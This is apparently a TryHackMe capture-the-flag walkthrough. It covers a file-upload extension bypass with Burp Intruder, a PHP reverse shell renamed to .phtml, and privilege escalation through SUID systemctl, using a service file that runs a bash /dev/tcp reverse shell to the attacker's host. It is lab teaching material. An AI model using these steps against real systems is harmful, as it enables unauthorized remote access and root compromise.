# Compromise the webserver

### Try upload a few file types to the server, what common extension seems to be blocked?
> *Answer:* .php

### Run this attack, what extension is allowed?
Going to use BurpSuite.<br>
We're going to use Intruder (used for automating customised attacks).<br>
To begin, make a wordlist with the following extensions in:
<p><img src="https://i.imgur.com/ED153Nx.png" style="font-size:1rem;width:227px;height:103.976px"></p>
Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.<br>
Click the "Positions" tab now, find the filename and "Add Â§" to the extension. It should look like so:

> *Answer:* .phtml

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!<br>
Download the following reverse PHP shell <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">here</a>.<br>
To gain remote access to this machine, follow these steps:
  1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
  2. Rename this file to php-reverse-shell.phtml
  3. We're now going to listen to incoming connections using netcat. Run the following command: <b>nc -lvnp 1234</b>
  4. Upload your shell and navigate to <b>http://&lt;machine ip&gt;:3333/internal/uploads/php-reverse-shell.phtml&nbsp;</b> - This will execute your payload
  5. You should see a connection on your netcat session

# Privilege Escalation

### On the system, search for all SUID files. What file stands out?
```
machine:~$ find / -perm -u=s -type f | grep -v "Permission denied"
...
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
> *Answer:* /bin/systemctl

### Become root and get the last flag (/root/root.txt)
Create a file called *root.service* inside kali apache2 server.
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# cat > /var/www/html/root.service
[Unit]
Description=PrivEsc

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<kali ip>/8888 0>&1'

[Install]
wantedBy=multi-user.target ^D
```

Put file *root.service* to machine, then create symlink and start service.
```
machine:~$ cd /tmp
machine:~/tmp$ wget <kali ip>/root.service
...
2021-09-19 04:09:25 (32.9 MB/s) - 'root.service' saved [175/175]
machine:~$ /bin/systemctl enable /tmp/root.service
Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
machine:~$ /bin/systemctl start root.service
```

Listen to incoming connections using netcat.
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nc -lvnp 8888
